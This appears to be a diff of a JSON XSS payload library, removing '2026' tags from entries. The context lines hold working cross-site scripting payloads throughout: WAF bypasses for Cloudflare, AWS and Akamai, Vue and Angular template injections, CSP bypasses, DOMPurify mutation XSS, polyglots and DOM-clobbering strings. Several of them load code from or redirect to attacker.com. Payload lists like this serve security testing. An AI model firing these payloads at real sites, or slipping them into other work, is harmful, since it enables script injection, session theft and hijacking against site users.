@@ -169,15 +169,14 @@
         },
         {
           "name": "Popover BeforeToggle",
-          "description": "Popover API onbeforetoggle \u2014 works on hidden inputs (2024+)",
+          "description": "Popover API onbeforetoggle \u2014 works on hidden inputs",
           "contexts": [
             "html"
           ],
           "severity": "high",
           "tags": [
             "basic",
-            "popover",
-            "2026"
+            "popover"
           ],
           "payload": "<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>"
         },
@@ -190,8 +189,7 @@
           "severity": "high",
           "tags": [
             "basic",
-            "scroll",
-            "2026"
+            "scroll"
           ],
           "payload": "<div onscrollend=alert(1) style=\"overflow:auto;height:50px\"><br><br><br><br></div>"
         },
@@ -204,8 +202,7 @@
           "severity": "high",
           "tags": [
             "basic",
-            "css",
-            "2026"
+            "css"
           ],
           "payload": "<div oncontentvisibilityautostatechange=alert(1) style=\"display:block;content-visibility:auto\"></div>"
         },
@@ -218,22 +215,20 @@
           "severity": "high",
           "tags": [
             "basic",
-            "dialog",
-            "2026"
+            "dialog"
           ],
           "payload": "<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>"
         },
         {
           "name": "Search Element AutoFocus",
-          "description": "New HTML search element with autofocus (2023+)",
+          "description": "New HTML search element with autofocus",
           "contexts": [
             "html"
           ],
           "severity": "high",
           "tags": [
             "basic",
-            "search",
-            "2026"
+            "search"
           ],
           "payload": "<search onfocus=alert(1) autofocus tabindex=0>test</search>"
         },
@@ -246,8 +241,7 @@
           "severity": "high",
           "tags": [
             "basic",
-            "scroll-snap",
-            "2026"
+            "scroll-snap"
           ],
           "payload": "<address onscrollsnapchange=alert(1) style=\"overflow-y:hidden;scroll-snap-type:x\"><div style=\"scroll-snap-align:center\">1337</div></address>"
         }
@@ -866,8 +860,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "cloudflare",
-            "2026"
+            "cloudflare"
           ],
           "payload": "<svg onload=prompt%26%230000000040document.domain)>"
         },
@@ -881,8 +874,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "cloudflare",
-            "2026"
+            "cloudflare"
           ],
           "payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>"
         },
@@ -895,8 +887,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "cloudflare",
-            "2026"
+            "cloudflare"
           ],
           "payload": "<svg onx=() onload=window.alert?.()>"
         },
@@ -909,8 +900,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "cloudflare",
-            "2026"
+            "cloudflare"
           ],
           "payload": "<img src=x onError=import('//attacker.com/')>"
         },
@@ -924,8 +914,7 @@
           "tags": [
             "waf",
             "cloudflare",
-            "encoding",
-            "2026"
+            "encoding"
           ],
           "payload": "<--%253cimg%20onerror=alert(1)%20src=a%253e --!>"
         },
@@ -938,8 +927,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "cloudflare",
-            "2026"
+            "cloudflare"
           ],
           "payload": "<svg on =i onload=alert(domain)>"
         },
@@ -953,8 +941,7 @@
           "tags": [
             "waf",
             "aws",
-            "popover",
-            "2026"
+            "popover"
           ],
           "payload": "<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>"
         },
@@ -967,8 +954,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "aws",
-            "2026"
+            "aws"
           ],
           "payload": "<xss oncontentvisibilityautostatechange=alert(1) style=\"display:block;content-visibility:auto\">"
         },
@@ -981,8 +967,7 @@
           "severity": "high",
           "tags": [
             "waf",
-            "akamai",
-            "2026"
+            "akamai"
           ],
           "payload": "<iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>"
         },
@@ -996,8 +981,7 @@
           "tags": [
             "waf",
             "akamai",
-            "svg",
-            "2026"
+            "svg"
           ],
           "payload": "<svg><animatetransform onbegin=alert(1)>"
         }
@@ -1154,8 +1138,7 @@
           "tags": [
             "framework",
             "vue",
-            "teleport",
-            "2026"
+            "teleport"
           ],
           "payload": "<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport>"
         },
@@ -1169,8 +1152,7 @@
           "tags": [
             "framework",
             "vue",
-            "template",
-            "2026"
+            "template"
           ],
           "payload": "{{$emit.constructor`alert(1)`()}}"
         },
@@ -1184,8 +1166,7 @@
           "tags": [
             "framework",
             "vue",
-            "component",
-            "2026"
+            "component"
           ],
           "payload": "<x is=script src=//attacker.com>"
         },
@@ -1199,8 +1180,7 @@
           "tags": [
             "framework",
             "vue",
-            "mxss",
-            "2026"
+            "mxss"
           ],
           "payload": "<x title\"=\"&lt;iframe&Tab;onload&Tab;=alert(1)&gt;\">"
         },
@@ -1214,8 +1194,7 @@
           "tags": [
             "framework",
             "vue",
-            "event",
-            "2026"
+            "event"
           ],
           "payload": "<img src @error=\"e=$event.composedPath().pop().alert(1)\">"
         },
@@ -1228,8 +1207,7 @@
           "severity": "high",
           "tags": [
             "framework",
-            "react",
-            "2026"
+            "react"
           ],
           "payload": "<a href=\"javascript:alert(document.domain)\">Click</a>"
         },
@@ -1243,8 +1221,7 @@
           "tags": [
             "framework",
             "angular",
-            "template",
-            "2026"
+            "template"
           ],
           "payload": "{{constructor.constructor('alert(1)')()}}"
         }
@@ -1263,8 +1240,7 @@
           "severity": "high",
           "tags": [
             "csp",
-            "jsonp",
-            "2026"
+            "jsonp"
           ],
           "payload": "<script src=\"https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1\"></script>"
         },
@@ -1278,8 +1254,7 @@
           "tags": [
             "csp",
             "angular",
-            "gadget",
-            "2026"
+            "gadget"
           ],
           "payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"
         },
@@ -1293,8 +1268,7 @@
           "tags": [
             "csp",
             "data-uri",
-            "object",
-            "2026"
+            "object"
           ],
           "payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>"
         },
@@ -1308,8 +1282,7 @@
           "tags": [
             "csp",
             "iframe",
-            "srcdoc",
-            "2026"
+            "srcdoc"
           ],
           "payload": "<iframe srcdoc='<script src=\"data:text/javascript,alert(document.domain)\"></script>'></iframe>"
         },
@@ -1322,8 +1295,7 @@
           "severity": "high",
           "tags": [
             "csp",
-            "base",
-            "2026"
+            "base"
           ],
           "payload": "<base href=\"https://attacker.com/\"><script src=\"/payload.js\"></script>"
         },
@@ -1336,8 +1308,7 @@
           "severity": "medium",
           "tags": [
             "csp",
-            "meta",
-            "2026"
+            "meta"
           ],
           "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
         },
@@ -1350,8 +1321,7 @@
           "severity": "high",
           "tags": [
             "csp",
-            "injection",
-            "2026"
+            "injection"
           ],
           "payload": "/?csp=; script-src * 'unsafe-inline';&xss=<script>alert(1)</script>"
         }
@@ -1372,8 +1342,7 @@
             "mxss",
             "dompurify",
             "svg",
-            "cve",
-            "2026"
+            "cve"
           ],
           "payload": "<svg><desc>\\onload=${alert(1337)}</desc></svg>"
         },
@@ -1387,8 +1356,7 @@
           "tags": [
             "mxss",
             "dompurify",
-            "noscript",
-            "2026"
+            "noscript"
           ],
           "payload": "<noscript><img src=x onerror=alert(1)></noscript>"
         },
@@ -1402,8 +1370,7 @@
           "tags": [
             "mxss",
             "mathml",
-            "chrome",
-            "2026"
+            "chrome"
           ],
           "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">"
         },
@@ -1417,8 +1384,7 @@
           "tags": [
             "mxss",
             "mathml",
-            "firefox",
-            "2026"
+            "firefox"
           ],
           "payload": "<math><mtext><table><mglyph><style><![CDATA[</style><img title=\"]]><img src=1 onerror=alert(1)>\">"
         },
@@ -1431,8 +1397,7 @@
           "severity": "high",
           "tags": [
             "mxss",
-            "textarea",
-            "2026"
+            "textarea"
           ],
           "payload": "<textarea><img src=x onerror=alert(1)></textarea>"
         },
@@ -1446,8 +1411,7 @@
           "tags": [
             "mxss",
             "svg",
-            "foreignobject",
-            "2026"
+            "foreignobject"
           ],
           "payload": "<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>"
         }
@@ -1469,8 +1433,7 @@
           "severity": "high",
           "tags": [
             "polyglot",
-            "universal",
-            "2026"
+            "universal"
           ],
           "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>"
         },
@@ -1486,8 +1449,7 @@
           "severity": "high",
           "tags": [
             "polyglot",
-            "universal",
-            "2026"
+            "universal"
           ],
           "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//>"
         },
@@ -1502,8 +1464,7 @@
           "severity": "high",
           "tags": [
             "polyglot",
-            "compact",
-            "2026"
+            "compact"
           ],
           "payload": "-->'\"/</ sCript><svG x=\">\" onload=(co\\u006efirm)``>"
         },
@@ -1517,8 +1478,7 @@
           "severity": "high",
           "tags": [
             "polyglot",
-            "attribute",
-            "2026"
+            "attribute"
           ],
           "payload": "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"
         },
@@ -1531,8 +1491,7 @@
           "severity": "high",
           "tags": [
             "polyglot",
-            "javascript",
-            "2026"
+            "javascript"
           ],
           "payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
         }
@@ -1551,8 +1510,7 @@
           "severity": "high",
           "tags": [
             "dom-clobbering",
-            "form",
-            "2026"
+            "form"
           ],
           "payload": "<form name=\"authConfig\" data-next=\"https://attacker.com/\" data-append=\"true\"></form>"
         },
@@ -1565,8 +1523,7 @@
           "severity": "high",
           "tags": [
             "dom-clobbering",
-            "anchor",
-            "2026"
+            "anchor"
           ],
           "payload": "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">"
         },
@@ -1579,8 +1536,7 @@
           "severity": "medium",
           "tags": [
             "dom-clobbering",
-            "image",
-            "2026"
+            "image"
           ],
           "payload": "<img name=currentUser src=attacker-controlled-value>"
         },
@@ -1593,8 +1549,7 @@
           "severity": "high",
           "tags": [
             "dom-clobbering",
-            "embed",
-            "2026"
+            "embed"
           ],
           "payload": "<embed name=injectable src=\"data:text/html,<script>alert(1)</script>\">"
         },
@@ -1607,8 +1562,7 @@
           "severity": "high",
           "tags": [
             "dom-clobbering",
-            "chain",
-            "2026"
+            "chain"
           ],
           "payload": "<form id=config><input name=apiUrl value=https://attacker.com/api><input name=debug value=true></form>"
         }
